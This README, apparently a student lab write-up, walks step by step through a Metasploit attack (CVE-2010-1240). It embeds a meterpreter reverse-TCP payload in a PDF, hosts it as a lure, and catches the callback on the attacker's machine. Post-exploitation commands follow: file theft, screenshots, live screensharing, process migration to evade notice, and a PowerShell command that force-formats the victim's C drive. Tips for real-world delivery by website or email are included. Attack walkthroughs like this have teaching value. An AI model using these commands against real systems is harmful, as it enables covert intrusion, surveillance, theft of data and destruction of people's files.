# Embedded Backdoor Connection via PDF Files :smiling_imp:
***brought to you by*** &nbsp;&nbsp;&nbsp; ![](https://shields.io/badge/Bawang-Ranger-green?style=for-the-badge&logo=CodeIgniter&logoColor=orange)


## Introduction
This demonstration video shows how we can control the victim's device by sending the innocent-looking PDF file to the target which actually consists of embedded payload. The exploit was made public as CVE-2010-1240.

As soon as the PDF is opened in Adobe Reader, the users who are being tricked by us to agree on the security pop-ups will let us gain meterpreter session connected to their devices via reverse TCP connection. Till that time, all their data and what they're doing right now are under our surveillance. 

![Hehe~Boi](https://media.giphy.com/media/dPEJxh06y4OTC/giphy.gif)

## List of Software/Tools
- Metasploit 
- [Adobe Reader <= 8.1.2](http://www.oldversion.com/windows/acrobat-reader/) 

## Environment

[![Kali Linux](https://img.shields.io/badge/Kali%20Linux-%3E=%202021.1-005ab3?style=for-the-badge&logo=kali-linux&logoColor=white)](https://www.kali.org/get-kali/#kali-virtual-machines) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[![Windows 7 or 10](https://img.shields.io/badge/Windows-7%20%7C%2010%20-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[![Adobe Reader](https://img.shields.io/badge/Adobe%20Reader-%3C=%208.1.2-red?style=for-the-badge&logo=adobe-acrobat-reader&logoColor=white)](http://www.oldversion.com/windows/acrobat-reader-8-1-2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   

- **Attacker Machine**: Kali Linux version 2021.1  
- **Target OS**: Windows 10 (x86) or Windows 7 (x86) 
- **Target Software**: Adobe Reader 8.1.2 

## Detailed Steps
First, we launch the MSFconsole which provides command line interface for us to access the Metasploit framework.  
```
msfconsole
```

Then, search for exploit that matches our target Windows platform and Adobe PDF Reader, where it will display a whole list of exploits that can used to hijack into the victim’s Windows machine and exploits the Adobe PDF Reader vulnerabilities. 
```
search type:exploit platform:windows adobe pdf
```

In this exploitation, we select and use the module "adobe_pdf_embedded_exe" by using the command below to achieve the target of hijacking the victim. 
```
use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

We can also check the information of the exploit by using the “info” command as shown below:
```
info
```

Then, we set the payload to use reverse TCP connection. We also use the Meterpreter that provides an interactive shell which ease us to use all kinds of functions by insert and execute the code to explore the victim’s machine. 
```
set payload windows/meterpreter/reverse_tcp
```

Then, we will set for the listening host and port. For LHOST, we need to put in the attacker machine’s IP address, which in this case is our Kali machine’s IP address(10.0.2.4)*. 
- **`*p.s.`** 
  - *You have to use your own Kali machine's IP* 
  - *You can use a different port number*

Meanwhile for LPORT, it is up to us to set a port number which is not commonly used. 
```
# to check Kali machine’s IP address
ifconfig

set LHOST *10.0.2.4*
set LPORT 5665
```

Then, we will set the input file for the base of the PDF with INFILENAME* flag. Next, we will set the filename to something that will attract victim’s interest to open the malicious PDF file. 
- **`*p.s.`** 
  - *You have to make sure your PDF file path*
  - *You can use a different filename*  
```
set INFILENAME '/home/kali/Documents/WIC3004Assignment.pdf'
set FILENAME 'Bawang_Ranger_WIC3004Report.pdf'
```

We can view our options again before we enter “exploit” command to generate the payload together with PDF. 
```
# Then we can show the info or options by
show info | show options

exploit
```

Once we done generated the PDF file, we will move the file to /var/www/html which is the directory of our Kali machine’s to host the web application server for our victim to download the PDF file later.
- **`Note:`** 
  - *If you have set a different filename, make sure you copy the right path instead!*  
```
sudo mv /home/kali/.msf4/local/Bawang_Ranger_WIC3004Report.pdf /var/www/html
```

Then, to set up our listener, we will make use of "exploit/multi/handler". Again, we will set the payload, LHOST, LPORT aligned with what we have defined in generating the malicious PDF file. Then we will run the payload.
- **`Note:`** 
  - *LHOST: Please note for your own Kali machine's IP address*
  - *LPORT: If you have set a different port number, make sure you type in the number correctly* 
  - `show info` or `show options` is optional command to run.
     - Run it is just for verifying what you have set just now
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.2.4
set LPORT 5665
[show info | show options]
run
```

In another terminal, we check the status of the Apache server to ensure it is running to host our PDF file in /var/www/html for the victim to download the file.
```
service apache2 status

# If it is inactive, start the service
service apache2 start
```
---
On the Windows machine, open any browser such as Chrome browser and type in our Kali's IP (10.0.2.4)* to access the web application server of the Kali machine.

**`*Note:`** *Please note for your own Kali machine's IP address*

Then, mimic an user save the intended PDF file.

Once the file is opened by victim in Adobe Reader 8.1.2 with accepting to the prompt security messages, we then can observe on our Kali machine that we have a new session connected via reverse TCP connection.

**In real word scenario,** we will set up a website with the embedded-payload PDF to let victim download or attach the file via email.

---

## Result of the exploitation

Then, we can remotely access to the victim’s machine and then further performing more malicious behaviours that we wanted in the meterpreter session.

### To show a list of things that we can do
```
help
```
### List current directory 
``` 
pwd
```
### List the file on that directory
```
ls
```
### Download folder or file from victim machine
For example, there's a file named `password.txt`, we can issue `download password.txt` command
```
download [folder name | filename with extension]
```
### Create file on victim machine
Of course, we can write malicious script (implanting backdoor) to keep us connecting to the Windows machine if we're really evil! :skull:
```
   # Boot command prompt at background
   execute -f cmd.exe -H -i
   
   # Create file on Windows
   echo "You have been hacked" > hack.txt    
```
### Interact with Windows 
```
   #open the txt file we have just created
   hack.txt

   # Take screenshot
   screenshot
   
   # Watch the remote user in real time
   screenshare
```
### Additional
However, the attacker can reduce the suspicion by migrating the meterpreter process to a different one by using the migrate module in the meterpreter session.
```
meterpreter> run post/windows/manage/migrate
```
Here, it will automatically spawn a new process in the victim’s machine to migrate itself to. The victim would then be able to delete the infected PDF file, completely unaware that the process has already went elsewhere.

The attacker can further create malicious script on the target machine using command prompt (cmd) or PowerShell which is able to bring down the whole operating system to not function properly. 
```
meterpreter> shell 
```
```
# Start the Windows PowerShell
powershell

#Powershell command to forcefully format the C drive clean.
New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter C| Format-Volume -DriveLetter C -FileSystemLabel "New"-FileSystem NTFS -Full -Force -Confirm:$false
```

## Demonstration Video

[![Demo](https://i.imgur.com/FG8Ftvg.jpg)](https://youtu.be/TJkEAZb7-so "[Demonstration] Embedded Backdoor Connection via PDF Files | Bawang Ranger")


[//]: # (https://shields.io/badge/Chan-%20Jia%20Liang-green?style=for-the-badge&logo=CodeIgniter&logoColor=orange)
[//]: # (https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)
